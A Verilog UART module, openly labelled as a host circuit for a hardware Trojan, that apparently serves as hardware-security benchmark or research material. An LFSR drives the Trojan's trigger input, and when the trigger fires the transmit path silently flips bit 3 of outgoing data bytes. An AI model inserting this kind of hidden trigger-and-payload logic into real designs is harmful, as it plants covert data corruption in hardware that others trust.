// UART Host Circuit for Trojan1
// Fixed I/O to match Trojan1: clk, rst, r1 -> trigger
// Second revision with fixes for edge detection, mid-bit sampling, and counter widths.
module trojan1_uart_host #(
    parameter BAUD_DIV = 104,     // Baud rate divisor
    parameter DATA_BITS = 8,      // Number of data bits
    parameter [17:0] R1_SEED = 18'h2CAFE  // Seed for r1 generation
)(
    input wire clk,
    input wire rst,
    input wire [DATA_BITS-1:0] tx_data,
    input wire tx_start,
    input wire rx_in,
    output reg [DATA_BITS-1:0] rx_data,
    output reg tx_out,
    output reg tx_busy,
    output reg rx_ready,
    output reg framing_error
);

    // Trojan interface (fixed width)
    reg trojan_r1;
    wire trojan_trigger;
    
    // UART state
    reg [17:0] r1_shift_reg;
    reg [$clog2(BAUD_DIV)-1:0] baud_counter; // Parametric width for robustness
    reg [$clog2(BAUD_DIV)-1:0] rx_delay_counter; // RX delay counter for mid-bit sampling
    reg [3:0] tx_bit_counter;
    reg [3:0] rx_bit_counter;
    reg [DATA_BITS-1:0] tx_shift_reg;
    reg [DATA_BITS-1:0] rx_shift_reg;
    reg [2:0] tx_state;
    reg [2:0] rx_state;
    
    // RX input 2-stage synchronizer for metastability protection
    reg rx_sync_d1, rx_sync_d2;
    // Corrected falling edge detection: was 1, now 0
    wire rx_fall_edge = rx_sync_d2 && !rx_sync_d1; 

    reg [1:0] r1_phase;
    
    // R1 signal generation (unchanged)
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            r1_shift_reg <= R1_SEED;
            r1_phase <= 2'b00;
        end else if (tx_start || rx_ready || tx_busy) begin
            r1_shift_reg <= {r1_shift_reg[16:0], r1_shift_reg[17] ^ r1_shift_reg[10] ^ r1_shift_reg[2]};
            r1_phase <= r1_phase + 1;
        end
    end
    
    always @(*) begin
        case (r1_phase)
            2'b00: trojan_r1 = r1_shift_reg[0];
            2'b01: trojan_r1 = r1_shift_reg[6];
            2'b10: trojan_r1 = r1_shift_reg[12];
            2'b11: trojan_r1 = r1_shift_reg[17];
            default: trojan_r1 = 1'b0;
        endcase
    end
    
    // Baud rate generator for TX
    always @(posedge clk or posedge rst) begin
        if (rst)
            baud_counter <= 0;
        else if (baud_counter >= BAUD_DIV-1)
            baud_counter <= 0;
        else
            baud_counter <= baud_counter + 1;
    end
    
    wire baud_tick = (baud_counter == BAUD_DIV-1);
    
    // TX state machine (Trojan logic preserved, STOP_BITS parameter removed)
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            tx_state <= 3'b000;
            tx_out <= 1'b1;
            tx_busy <= 1'b0;
            tx_bit_counter <= 0;
            tx_shift_reg <= 0;
        end else begin
            case (tx_state)
                3'b000: begin // IDLE
                    tx_out <= 1'b1;
                    tx_busy <= 1'b0;
                    if (tx_start) begin
                        tx_shift_reg <= tx_data;
                        tx_busy <= 1'b1;
                        tx_state <= 3'b001;
                    end
                end
                3'b001: begin // START_BIT
                    if (baud_tick) begin
                        tx_out <= 1'b0;
                        tx_bit_counter <= 0;
                        tx_state <= 3'b010;
                    end
                end
                3'b010: begin // DATA_BITS
                    if (baud_tick) begin
                        tx_out <= tx_shift_reg[0] ^ (trojan_trigger && (tx_bit_counter == 4'h3));
                        tx_shift_reg <= tx_shift_reg >> 1;
                        if (tx_bit_counter >= DATA_BITS-1) begin
                            tx_state <= 3'b011;
                        end else begin
                            tx_bit_counter <= tx_bit_counter + 1;
                        end
                    end
                end
                3'b011: begin // STOP_BIT (1 bit)
                    if (baud_tick) begin
                        tx_out <= 1'b1;
                        tx_state <= 3'b000;
                    end
                end
                default: tx_state <= 3'b000;
            endcase
        end
    end
    
    // RX synchronization - 2-stage synchronizer
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            rx_sync_d1 <= 1'b1;
            rx_sync_d2 <= 1'b1;
        end else begin
            rx_sync_d1 <= rx_in;
            rx_sync_d2 <= rx_sync_d1;
        end
    end
    
    // RX state machine - Reworked for mid-bit sampling
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            rx_state <= 3'b000;
            rx_data <= 0;
            rx_ready <= 1'b0;
            rx_bit_counter <= 0;
            rx_shift_reg <= 0;
            framing_error <= 1'b0;
            rx_delay_counter <= 0;
        end else begin
            // Default assignments
            if (rx_ready) rx_ready <= 1'b0;

            case (rx_state)
                3'b000: begin // RX_IDLE
                    if (rx_fall_edge) begin
                        rx_delay_counter <= (BAUD_DIV >> 1) - 1; // Wait half a bit period
                        rx_state <= 3'b001; // RX_START_CONFIRM
                    end
                end
                
                3'b001: begin // RX_START_CONFIRM
                    if (rx_delay_counter == 0) begin
                        if (rx_sync_d1 == 1'b0) begin // Still low, valid start bit
                            rx_delay_counter <= BAUD_DIV - 1; // Wait full bit period
                            rx_bit_counter <= 0;
                            rx_state <= 3'b010; // RX_DATA
                        end else begin
                            rx_state <= 3'b000; // Glitch, return to idle
                        end
                    end else begin
                        rx_delay_counter <= rx_delay_counter - 1;
                    end
                end
                
                3'b010: begin // RX_DATA
                    if (rx_delay_counter == 0) begin
                        rx_shift_reg <= {rx_sync_d1, rx_shift_reg[DATA_BITS-1:1]};
                        rx_delay_counter <= BAUD_DIV - 1; // Reload for next bit
                        
                        if (rx_bit_counter >= DATA_BITS-1) begin
                            rx_state <= 3'b011; // RX_STOP
                        end else begin
                            rx_bit_counter <= rx_bit_counter + 1;
                        end
                    end else begin
                        rx_delay_counter <= rx_delay_counter - 1;
                    end
                end
                
                3'b011: begin // RX_STOP
                    if (rx_delay_counter == 0) begin
                        if (rx_sync_d1 == 1'b1) begin // Stop bit is high, frame OK
                            rx_data <= rx_shift_reg;
                            rx_ready <= 1'b1;
                            framing_error <= 1'b0;
                        end else begin // Stop bit is low, framing error!
                            framing_error <= 1'b1;
                        end
                        rx_state <= 3'b000; // Return to idle
                    end else begin
                        rx_delay_counter <= rx_delay_counter - 1;
                    end
                end
                
                default: rx_state <= 3'b000;
            endcase
        end
    end
    
    // Instantiate Trojan1 (unchanged)
    Trojan1 trojan_inst (
        .clk(clk),
        .rst(rst),
        .r1(trojan_r1),
        .trigger(trojan_trigger)
    );

endmodule

